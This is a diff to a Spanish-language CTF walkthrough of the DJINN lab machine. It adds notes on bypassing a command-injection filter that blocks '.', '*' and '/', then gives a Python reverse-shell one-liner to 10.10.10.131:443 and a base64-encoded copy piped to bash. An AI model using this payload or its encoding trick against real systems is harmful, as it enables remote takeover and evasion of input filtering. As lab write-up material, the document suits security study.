@@ -168,10 +168,21 @@ cmd=id
 
 <img src="https://github.com/El-Palomo/DJINN/blob/main/dj4.jpg" width=80% />
 
-- Todo parece fácil, sin embargo, algunos caracteres no estaban permitidos y eso limitada las operaciones: el punto (.), asterisco (*) y slash (/) 
+- Todo parece fácil, sin embargo, algunos caracteres no estaban permitidos y eso limitada las operaciones: el punto (.), asterisco (*) y slash (/).
+- Después de darle muchas vueltas (1 hora), teníamos que aplicar algun encode para obtener shell. BASE64.
 
 
+```
+//Texto sin ENCODE
 
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.131",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+//Texto con ENCODE
+echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTAuMTMxIiw0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc= | base64 -d | bash
+```
+
+<img src="https://github.com/El-Palomo/DJINN/blob/main/dj5.jpg" width=80% />
 
 
 
